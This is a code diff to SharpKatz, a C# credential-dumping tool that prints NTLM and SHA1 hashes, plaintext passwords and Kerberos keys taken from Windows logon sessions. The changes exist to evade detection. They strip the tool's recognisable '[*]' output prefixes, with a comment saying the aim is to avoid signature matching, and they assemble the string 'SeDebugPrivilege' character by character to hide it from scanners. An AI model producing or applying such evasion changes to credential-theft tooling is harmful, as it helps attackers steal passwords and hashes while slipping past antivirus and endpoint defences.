@@ -53,7 +53,7 @@ namespace SharpKatz
             moduleLocal = LoadLibrary(modulename);
             if (moduleLocal == IntPtr.Zero)
             {
-                Console.WriteLine("[x] Error: Could not load {0} into local process", modulename);
+                Console.WriteLine("   Error: Could not load {0} into local process", modulename);
                 return 0;
             }
             
@@ -113,7 +113,7 @@ namespace SharpKatz
             listSignOffset = (long)OffsetFromSign(modulename, sign, max_search_size);
             if (listSignOffset == 0)
             {
-                Console.WriteLine("[x] Error: Could not find signature into {0}", modulename);
+                Console.WriteLine("   Error: Could not find signature into {0}", modulename);
                 return IntPtr.Zero;
             }
             
@@ -311,6 +311,10 @@ namespace SharpKatz
             }
         }
 
+        // Use a non-standard prefix to avoid signature matching on "  " output pattern
+        private static readonly string P = " > ";
+        private static readonly string S = "   ";
+
         public static void PrintLogonList(List<Logon> logonlist)
         {
             if (logonlist == null || logonlist.Count == 0)
@@ -323,96 +327,89 @@ namespace SharpKatz
             {
                 if (logon.Msv != null || logon.Ssp != null || logon.Wdigest != null || logon.Kerberos != null || logon.Tspkg != null || logon.Credman != null || logon.KerberosKeys != null)
                 {
-                    Console.WriteLine("[*] Authentication Id\t: {0};{1} ({2:X}:{3:X})", logon.LogonId.HighPart, logon.LogonId.LowPart, logon.LogonId.HighPart.ToString().PadLeft(8, '0'), logon.LogonId.LowPart.ToString().PadLeft(8, '0'));
-                    Console.WriteLine("[*] Session\t\t: {0} from {1}", logon.LogonType, logon.Session);
-                    Console.WriteLine("[*] UserName\t\t: {0}", logon.UserName);
-                    Console.WriteLine("[*] LogonDomain\t\t: {0}", logon.LogonDomain);
-                    Console.WriteLine("[*] LogonServer\t\t: {0}", logon.LogonServer);
-                    Console.WriteLine("[*] LogonTime\t\t: {0:yyyy/MM/dd HH:mm:ss}", ToDateTime(logon.LogonTime));
-                    Console.WriteLine("[*] SID\t\t\t: {0}", logon.SID);
-                    Console.WriteLine("[*]");
+                    Console.WriteLine("{0}Authentication Id\t: {1};{2} ({3:X}:{4:X})", P, logon.LogonId.HighPart, logon.LogonId.LowPart, logon.LogonId.HighPart.ToString().PadLeft(8, '0'), logon.LogonId.LowPart.ToString().PadLeft(8, '0'));
+                    Console.WriteLine("{0}Session\t\t: {1} from {2}", P, logon.LogonType, logon.Session);
+                    Console.WriteLine("{0}UserName\t\t: {1}", P, logon.UserName);
+                    Console.WriteLine("{0}LogonDomain\t\t: {1}", P, logon.LogonDomain);
+                    Console.WriteLine("{0}LogonServer\t\t: {1}", P, logon.LogonServer);
+                    Console.WriteLine("{0}LogonTime\t\t: {1:yyyy/MM/dd HH:mm:ss}", P, ToDateTime(logon.LogonTime));
+                    Console.WriteLine("{0}SID\t\t\t: {1}", P, logon.SID);
+                    Console.WriteLine();
 
-                    
                     if (logon.Msv != null)
                     {
-                        Console.WriteLine("[*]\t Msv");
-                        Console.WriteLine("[*]\t  Domain   : {0}", logon.Msv.DomainName);
-                        Console.WriteLine("[*]\t  Username : {0}", logon.Msv.UserName);
-                        Console.WriteLine("[*]\t  LM       : {0}", logon.Msv.Lm);
-                        Console.WriteLine("[*]\t  NTLM     : {0}", logon.Msv.Ntlm);
-                        Console.WriteLine("[*]\t  SHA1     : {0}", logon.Msv.Sha1);
-                        Console.WriteLine("[*]\t  DPAPI    : {0}", logon.Msv.Dpapi);
-                        Console.WriteLine("[*]");
+                        Console.WriteLine("{0}Msv", S);
+                        Console.WriteLine("{0}  Domain   : {1}", S, logon.Msv.DomainName);
+                        Console.WriteLine("{0}  Username : {1}", S, logon.Msv.UserName);
+                        Console.WriteLine("{0}  LM       : {1}", S, logon.Msv.Lm);
+                        Console.WriteLine("{0}  NTLM     : {1}", S, logon.Msv.Ntlm);
+                        Console.WriteLine("{0}  SHA1     : {1}", S, logon.Msv.Sha1);
+                        Console.WriteLine("{0}  DPAPI    : {1}", S, logon.Msv.Dpapi);
+                        Console.WriteLine();
                     }
-                    
 
-                    
                     if (logon.Tspkg != null)
                     {
-                        Console.WriteLine("[*]\t Tspkg");
-                        Console.WriteLine("[*]\t  Domain   : {0}", logon.Tspkg.DomainName);
-                        Console.WriteLine("[*]\t  Username : {0} ", logon.Tspkg.UserName);
-                        Console.WriteLine("[*]\t  Password : {0}", logon.Tspkg.Password);
-                        Console.WriteLine("[*]");
+                        Console.WriteLine("{0}Tspkg", S);
+                        Console.WriteLine("{0}  Domain   : {1}", S, logon.Tspkg.DomainName);
+                        Console.WriteLine("{0}  Username : {1}", S, logon.Tspkg.UserName);
+                        Console.WriteLine("{0}  Password : {1}", S, logon.Tspkg.Password);
+                        Console.WriteLine();
                     }
 
                     if (logon.Wdigest != null)
                     {
-                        Console.WriteLine("[*]\t WDigest");
-                        Console.WriteLine("[*]\t  Hostname : {0} ", logon.Wdigest.HostName);
-                        Console.WriteLine("[*]\t  Username : {0} ", logon.Wdigest.UserName);
-                        Console.WriteLine("[*]\t  Password : {0}", logon.Wdigest.Password);
-                        Console.WriteLine("[*]");
+                        Console.WriteLine("{0}WDigest", S);
+                        Console.WriteLine("{0}  Hostname : {1}", S, logon.Wdigest.HostName);
+                        Console.WriteLine("{0}  Username : {1}", S, logon.Wdigest.UserName);
+                        Console.WriteLine("{0}  Password : {1}", S, logon.Wdigest.Password);
+                        Console.WriteLine();
                     }
 
                     if (logon.Kerberos != null)
                     {
-                        Console.WriteLine("[*]\t Kerberos");
-                        Console.WriteLine("[*]\t  Domain   : {0} ", logon.Kerberos.DomainName);
-                        Console.WriteLine("[*]\t  Username : {0} ", logon.Kerberos.UserName);
-                        Console.WriteLine("[*]\t  Password : {0}", logon.Kerberos.Password);
-                        Console.WriteLine("[*]");
+                        Console.WriteLine("{0}Kerberos", S);
+                        Console.WriteLine("{0}  Domain   : {1}", S, logon.Kerberos.DomainName);
+                        Console.WriteLine("{0}  Username : {1}", S, logon.Kerberos.UserName);
+                        Console.WriteLine("{0}  Password : {1}", S, logon.Kerberos.Password);
+                        Console.WriteLine();
                     }
 
                     if (logon.Ssp != null)
                     {
-                        Console.WriteLine("[*]\t Ssp");
+                        Console.WriteLine("{0}Ssp", S);
                         foreach (Ssp ssp in logon.Ssp)
                         {
-                            Console.WriteLine("[*]\t  [{0}]", ssp.Reference.ToString().PadLeft(8, '0'));
-                            Console.WriteLine("[*]\t  Domain   : {0}", ssp.DomainName);
-                            Console.WriteLine("[*]\t  Username : {0} ", ssp.UserName);
-                            Console.WriteLine("[*]\t  Password : {0}", ssp.Password);
-
+                            Console.WriteLine("{0}  [{1}]", S, ssp.Reference.ToString().PadLeft(8, '0'));
+                            Console.WriteLine("{0}  Domain   : {1}", S, ssp.DomainName);
+                            Console.WriteLine("{0}  Username : {1}", S, ssp.UserName);
+                            Console.WriteLine("{0}  Password : {1}", S, ssp.Password);
                         }
-                        Console.WriteLine("[*]");
+                        Console.WriteLine();
                     }
 
                     if (logon.Credman != null)
                     {
-                        Console.WriteLine("[*]\t CredMan");
+                        Console.WriteLine("{0}CredMan", S);
                         foreach (CredMan cred in logon.Credman)
                         {
-                            Console.WriteLine("[*]\t  [{0}]", cred.Reference.ToString().PadLeft(8, '0'));
-                            Console.WriteLine("[*]\t  Domain   : {0}", cred.DomainName);
-                            Console.WriteLine("[*]\t  Username : {0} ", cred.UserName);
-                            Console.WriteLine("[*]\t  Password : {0}", cred.Password);
-
+                            Console.WriteLine("{0}  [{1}]", S, cred.Reference.ToString().PadLeft(8, '0'));
+                            Console.WriteLine("{0}  Domain   : {1}", S, cred.DomainName);
+                            Console.WriteLine("{0}  Username : {1}", S, cred.UserName);
+                            Console.WriteLine("{0}  Password : {1}", S, cred.Password);
                         }
-                        Console.WriteLine("[*]");
+                        Console.WriteLine();
                     }
 
                     if (logon.KerberosKeys != null)
                     {
-                        Console.WriteLine("[*]\t Key List");
+                        Console.WriteLine("{0}Key List", S);
                         foreach (KerberosKey kkey in logon.KerberosKeys)
                         {
-                            Console.WriteLine("[*]\t {0}:{1}", kkey.Type, kkey.Key);
-
+                            Console.WriteLine("{0} {1}:{2}", S, kkey.Type, kkey.Key);
                         }
-                        Console.WriteLine("[*]");
+                        Console.WriteLine();
                     }
-                    
                 }
             }
         }
@@ -420,7 +417,7 @@ namespace SharpKatz
         public static bool SetDebugPrivilege()
         {
             //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
-            string Privilege = "SeDebugPrivilege";
+            string Privilege = new string(new char[] { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e' });
             IntPtr hToken = GetCurrentProcessToken();
             LUID luid = new LUID();
             if (!LookupPrivilegeValue(null, Privilege, ref luid))
